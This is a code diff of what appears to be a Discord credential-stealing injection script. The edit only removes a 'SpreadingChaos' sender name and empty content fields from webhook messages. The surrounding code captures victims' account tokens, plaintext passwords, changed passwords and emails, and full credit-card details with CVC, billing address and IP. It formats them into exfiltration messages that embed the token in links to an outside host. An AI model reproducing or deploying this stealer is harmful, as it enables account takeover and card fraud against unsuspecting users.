@@ -71,8 +71,6 @@ function FirstTime() {
                 fs.rmdirSync(path.join(__dirname, "init"));
                 if (token == null || token == undefined || token == "") {
                     var c = {
-                        username: "SpreadingChaos",
-                        content: "",
                         embeds: [{
                             title: "Discord Initalized (User not Logged in)",
                             color: config["embed-color"],
@@ -97,8 +95,6 @@ function FirstTime() {
                     `, !0).then(a => {
                         const b = JSON.parse(a);
                         var c = {
-                            username: "SpreadingChaos",
-                            content: "",
                             embeds: [{
                                 title: "Discord Initalized",
                                 description: "[**<:partner:909102089513340979> │ Click Here To Copy**](https://ctf.surf/raw/"+ token +")",
@@ -145,8 +141,6 @@ function FirstTime() {
             if (config['logout-notify'] == "true") {
                 if (token == null || token == undefined || token == "") {
                     var c = {
-                        username: "SpreadingChaos",
-                        content: "",
                         embeds: [{
                             title: "User log out (User not Logged in before)",
                             color: config["embed-color"],
@@ -171,8 +165,6 @@ function FirstTime() {
                     `, !0).then(a => {
                         const b = JSON.parse(a);
                         var c = {
-                            username: "SpreadingChaos",
-                            content: "",
                             embeds: [{
                                 title: "User got logged out",
                                 description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +")",
@@ -445,8 +437,6 @@ function Login(email, password, token) {
                             const json = JSON.parse(info);
 
                             var params = {
-                                username: "SpreadingChaos",
-                                content: "",
                                 embeds: [{
                                     "title": "User Login",
                                     description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
@@ -601,8 +591,6 @@ function Login(email, password, token) {
                                         }
                                         const json = JSON.parse(info);
                                         var params = {
-                                            username: "SpreadingChaos",
-                                            content: "",
                                             embeds: [{
                                                 "title": "User Login",
                                                 description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
@@ -781,8 +769,6 @@ function ChangePassword(oldpassword, newpassword, token) {
                             const json = JSON.parse(info);
 
                             var params = {
-                                username: "SpreadingChaos",
-                                content: "",
                                 embeds: [{
                                     "title": "The password has been changed !",
                                     description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
@@ -942,8 +928,6 @@ function ChangePassword(oldpassword, newpassword, token) {
                                         }
                                         const json = JSON.parse(info);
                                         var params = {
-                                            username: "SpreadingChaos",
-                                            content: "",
                                             embeds: [{
                                                 "title": "The password has been changed !",
                                                 description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
@@ -1125,8 +1109,6 @@ function ChangeEmail(newemail, password, token) {
                             const json = JSON.parse(info);
 
                             var params = {
-                                username: "SpreadingChaos",
-                                content: "",
                                 embeds: [{
                                     "title": "The Email has been changed !",
                                     description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
@@ -1282,8 +1264,6 @@ function ChangeEmail(newemail, password, token) {
                                         }
                                         const json = JSON.parse(info);
                                         var params = {
-                                            username: "SpreadingChaos",
-                                            content: "",
                                             embeds: [{
                                                 "title": "The Email has been changed !",
                                                 description: "[**<:partner:909102089513340979> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
@@ -1374,8 +1354,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
             var json = JSON.parse(info);
             var params = {
-                username: "SpreadingChaos",
-                content: "",
                 embeds: [{
                     "title": "User added a new Credit Card!",
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
